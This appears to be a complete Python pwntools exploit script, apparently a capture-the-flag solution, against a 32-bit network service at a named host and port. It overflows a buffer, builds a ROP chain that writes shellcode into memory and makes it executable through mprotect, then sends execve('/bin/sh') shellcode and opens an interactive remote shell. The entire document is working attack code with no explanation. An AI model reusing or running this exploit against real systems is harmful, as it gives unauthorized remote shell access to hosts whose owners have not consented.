from pwn import *
import sys, time

if (len(sys.argv) != 2):
	print "input cmd"
	exit()

ret = 0x80484bb
popret = 0x80484dc
pop2ret = 0x80486a2
pop4ret = 0x80489cc
pop3ret = 0x804878d
recv_plt = 0x080485F0
recv_got = 0x0804A040
send_plt = 0x08048610
puts_plt = 0x08048550
puts_got = 0x0804A018
data = 0xf7ffd000
func = 0x080486F3
system = 0xf7e4bda0

libcbase = 0xf7e11000
mprotect = libcbase+0xe2d50

shellcode =  "6a045b6a0359496a3f58cd8075f86a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80".decode("hex")

payload ="a"*(0x408+4)
payload+=p32(recv_plt)		# write shellcode in data section
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(data)
payload+=p32(len(shellcode))
payload+=p32(0)
payload+=p32(send_plt)
payload+=p32(pop4ret)
payload+=p32(4)
payload+=p32(data)
payload+=p32(len(shellcode))
payload+=p32(0)
payload+=p32(mprotect)
payload+=p32(data)
payload+=p32(data)
payload+=p32(0xff)
payload+=p32(0x7)

while True:
	s = connect("stealthee.kr", 7777)
	try:
		s.recv()
		s.send(payload)
		time.sleep(0.5)
		s.send(shellcode)
		s.send(sys.argv[1])
		s.recv()
		log.info("SUCCESSFUL TO EXPLOIT")
		break
	except Exception as e:
		s.close()
		continue
s.interactive()
